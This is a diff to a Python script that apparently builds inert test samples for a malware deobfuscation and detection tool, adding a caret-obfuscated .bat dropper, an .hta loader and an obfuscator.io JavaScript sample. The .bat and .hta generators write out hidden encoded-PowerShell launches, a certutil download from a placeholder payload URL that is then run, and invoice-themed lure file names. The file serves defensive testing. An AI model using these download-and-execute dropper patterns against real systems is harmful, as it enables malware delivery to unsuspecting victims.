@@ -601,17 +601,61 @@ def dropper_vbs() -> bytes:
     return body.encode()
 
 
+def obf_obfuscatorio_js() -> bytes:
+    """A .js obfuscated with obfuscator.io (string-array + rotator + accessor,
+    control-flow flattening) — the scheme the pure-Python cascade cannot flatten
+    and webcrack does. Pre-generated (no Node needed at sample time) and stored
+    base64 beside this script; all indicators are inert."""
+    b64 = (Path(__file__).resolve().parent / "_obfuscatorio_js.b64").read_text()
+    return base64.b64decode("".join(b64.split()))
+
+
+def dropper_bat() -> bytes:
+    """A .bat using caret escaping + ``set`` indirection to hide a PowerShell
+    launch and a certutil download — exercises the batch deobfuscator + rules."""
+    body = (
+        "@echo off\r\n"
+        "rem Factura 2026-0187 - instalador\r\n"
+        "set a=power\r\n"
+        "set b=shell\r\n"
+        f"%a%%b% -nop -w hidden -enc {PS_B64}\r\n"
+        f"c^e^r^t^util -urlcache -split -f {PAYLOAD_URL} %TEMP%\\upd.bin\r\n"
+        "start /b %TEMP%\\upd.bin\r\n"
+    )
+    return body.encode()
+
+
+def loader_hta() -> bytes:
+    """An .hta carrying both VBScript and JScript that download and run —
+    exercises the HTA container extraction and the VBScript + JScript engines."""
+    body = (
+        '<html><head><hta:application id="x" windowstate="minimize"/>\n'
+        '<script language="VBScript">\n'
+        'Set sh = CreateObject("WScript.Shell")\n'
+        f'sh.Run "powershell -nop -w hidden -enc {PS_B64}", 0, False\n'
+        "</script>\n"
+        '<script language="JScript">\n'
+        f"var x = new ActiveXObject('MSXML2.XMLHTTP'); x.open('GET','{PAYLOAD_URL}',false); x.send();\n"
+        "new ActiveXObject('WScript.Shell').Run('cmd /c start report.docm',0,false);\n"
+        "</script></head><body>Cargando factura...</body></html>\n"
+    )
+    return body.encode()
+
+
 def dropper_bundle_zip() -> bytes:
-    """A plain .zip bundling the three obfuscated scripts, to exercise the
-    nested (recursive) deobfuscation path: each child is deobfuscated on its own."""
+    """A plain .zip bundling the obfuscated scripts, to exercise the nested
+    (recursive) deobfuscation path: each child is deobfuscated on its own."""
     import io
     import zipfile
 
     buf = io.BytesIO()
     with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
         zf.writestr("factura_visor.js", obf_js())
+        zf.writestr("visor_seguro.js", obf_obfuscatorio_js())
         zf.writestr("actualizador.ps1", stage2_ps1())
         zf.writestr("factura.pdf.vbs", dropper_vbs())
+        zf.writestr("instalador.bat", dropper_bat())
+        zf.writestr("factura.hta", loader_hta())
     return buf.getvalue()
 
 
@@ -623,8 +667,10 @@ def build_all() -> dict[str, bytes]:
         "sample.dotx": word_dotx(), "sample.dotm": word_dotm(),
         "sample.rtf": rtf_doc(), "sample.pdf": pdf_doc(),
         "sample.eml": eml_doc(), "sample.emlx": emlx_doc(), "sample.msg": msg_doc(),
-        "sample_dropper.js": obf_js(), "sample_stage2.ps1": stage2_ps1(),
-        "sample_dropper.vbs": dropper_vbs(), "lab/dropper_bundle.zip": dropper_bundle_zip(),
+        "sample_dropper.js": obf_js(), "sample_obfuscatorio.js": obf_obfuscatorio_js(),
+        "sample_stage2.ps1": stage2_ps1(), "sample_dropper.vbs": dropper_vbs(),
+        "sample_dropper.bat": dropper_bat(), "sample_loader.hta": loader_hta(),
+        "lab/dropper_bundle.zip": dropper_bundle_zip(),
     }
     for ext in X_CT:
         out[f"sample{ext}"] = excel(ext)
